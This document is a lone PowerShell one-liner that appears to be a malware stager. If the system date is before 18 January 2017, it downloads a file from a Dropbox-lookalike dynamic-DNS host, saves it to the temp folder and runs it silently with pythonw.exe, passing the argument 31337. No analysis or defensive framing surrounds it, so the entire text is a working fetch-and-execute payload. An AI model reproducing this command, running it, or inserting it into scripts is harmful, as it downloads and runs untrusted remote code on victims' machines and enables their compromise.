
if ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http://drobbox-api.dynu.com/update',"$env:temp\update");Start-Process pythonw.exe "$env:temp\update 31337"};

